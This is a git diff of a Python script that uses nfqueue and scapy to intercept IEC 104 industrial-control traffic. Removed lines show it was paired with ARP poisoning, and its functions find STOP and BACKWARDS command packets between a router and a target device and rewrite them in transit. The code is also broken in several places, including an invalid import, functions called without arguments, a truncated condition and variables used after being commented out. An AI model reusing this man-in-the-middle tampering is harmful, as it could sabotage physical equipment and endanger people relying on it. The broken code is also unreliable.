@@ -5,9 +5,9 @@
     Based on nfqueue to block packets in the kernel and pass them to scapy for validation
 """
 
-
-from ARP_poisoning import *
-from ../IEC
+from iec104lib import *
+from iec104lib import *
+from EchoIEC104Server import *
 
 
 
@@ -49,17 +49,30 @@ def modify_stop_packet(chosen_packet):
 	del chosen_packet[TCP].chksum
 	#print(chosen_packet.show2())
 
-def is_104_packet_from_controller(packet):
-	if packet.haslayer(TCP) and (packet[TCP].dport ==2404) and (len (packet[TCP].payload) >0 )   :
+def is_packet_containing_apci(packet):
+	if packet.haslayer(u_frame) or packet.haslayer(s_frame) or packet.haslayer(i_frame) :
+		return True
+	else :
+		return False
+
+def is_104_packet_from_router(packet):
+	if is_packet_containing_apci()  and (packet[IP].src==ip_router):
 		return True
 	else:
 		return False
 
-def is_STOP_order_packet(chosen_packet):
-	if( not is_104_packet_from_controller(chosen_packet)):
+def is_104_packet_from_raspberry(packet):
+	if is_packet_containing_apci() and (packet[IP].src ==ip_target):
+		return True
+	else:
 		return False
-	payload_packet=str(chosen_packet[TCP].payload)
-	asdu_type=payload_packet[LENGTH_APCI:LENGTH_APCI+ASDU_TYPE_BYTE]
+
+
+def is_STOP_order_packet(chosen_packet):
+	if( not is_104_packet_from_raspberry(chosen_packet)):
+		return False
+	# payload_packet=str(chosen_packet[TCP].payload)
+	# asdu_type=payload_packet[LENGTH_APCI:LENGTH_APCI+ASDU_TYPE_BYTE]
 	if(asdu_type == ASDU_TYPE_ACT_CHAR):
 		asdu_order_value=payload_packet[LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE:LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE+ASDU_ACT_ORDER_VALUE_LENGTH]
 		if(asdu_order_value == ASDU_ACT_ORDER_STOP_VALUE_STR or asdu_order_value ==ASDU_ACT_ORDER_BACKWARDS_VALUE_STR):
@@ -72,9 +85,8 @@ def is_STOP_order_packet(chosen_packet):
 def callback_sniff(packet):
 	#packet[Ether].src == MAC_CONTROLLER and
 	if(packet[Ether].src == mac_router and packet[IP].src==ip_router and packet[IP].dst==ip_target):
-		#print("c->p")
 
-		if packet.haslayer(TCP) and is_STOP_order_packet(packet):
+		if is_packet_containing_apci() and is_:
 			modify_stop_packet(packet)
 #	else:
 #		print("not TCP")
